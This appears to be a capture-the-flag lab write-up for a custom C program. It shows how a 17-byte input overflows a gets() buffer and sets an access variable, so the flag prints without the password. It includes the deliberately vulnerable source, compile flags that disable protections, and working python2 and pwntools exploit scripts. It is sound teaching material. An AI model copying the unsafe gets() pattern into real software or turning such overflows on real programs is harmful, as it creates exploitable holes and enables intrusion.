---
description: 08/15/2023
---

# 1âƒ£ 01

This is an entirely custom project that I am extremely proud of. It consists of us overwriting variables on the stack in order to bypass compares so that you can grab the flag without even having the right password.

> Can you find the password?
>
> How can you get the flag without using the correct password?

## Static Source Code Analysis

```c
#include <stdio.h>
#include <string.h>

const char* hacked()
{
    const char* local_flag = {"XYC{H0wD1d1G3tH3r3?!}"};

    printf("This is a secret function.\n");
    printf("Access level 0 is required. All attempts to access will be logged.\n");
    printf("Oh yeah, here's your flag: %s\n", local_flag);

    return local_flag;

}

char * flag = "XYC{H0wD1d1G3tH3r3?!}";

int main()
{

    char code[16];
    int access = 0;

    printf("Please enter the secret code: \n");
    gets(code);
    fflush(stdout);

    if(strcmp(code, "1337") == 0)
    {
        flag = hacked();

        access = 1;
    }

    else
    {
        printf("Access denied, silent alarm has been triggered!\n");
    }

    if(access)
    {
        printf("Authentication successful as root (access level=%d) \n", access);
        printf("You are root, granting access... \nAccess granted, welcome root.\n");
        printf("Wow, you realized we could overflow the buffer and you could still get the flag? Nice.\nHere's your flag: %s", flag);
    }

    else
    {
        printf("Authentication failed as root (access level=%d)\n", access);
    }

    return 0;

}
```

Compile:

```
gcc 01.c -o 01 -m32 -fno-stack-protector -z execstack -no-pie -g
```

We can see that we have a `hacked()` function which contains our flag. Notice the return of `local_flag`.

We can also see that our flag is being set as a global so it can be accessed through main and passed throughout the program.&#x20;

Also, be conscious of the dangerous `gets()` call again, as we remember why this is dangerous from our last example in [00](00.md).&#x20;

Our `strcmp()` is being compared to our input to our buffer (`code`) which is of **16-bytes** and is looking for the correct input of "**1337**" so that we can access our secret function.

If we can input the password correctly, we will be granted access to the secret function.&#x20;

If not, we will trigger the alarm.

## Exploitation

### Manual Method

python2:

```
python2 -c 'print "A" * 17' > payload
```

Exploit:

```
./01 < payload
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### Automated Method (pwntools)

exploit.py:

```python
from pwn import *

# Establish the connection to the program
p = process('./01')  # Change this to the actual path of the '01' program

context.log_level = 'debug'

# Wait for the ':' prompt
p.recvuntil(':')

# Send 17 bytes of 'A' characters
payload = b'A' * 17
p.sendline(payload)

# Print the program's output
print(p.recvall().decode())

# Close the connection
p.close()
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## `gdb`

We can see our payload of A's overwriting our variables on the stack so we can bypass the comparisons/checks and get straight into the right version of our `hacked()` function that we want.

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

We never inputed the correct password of "1337":

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>
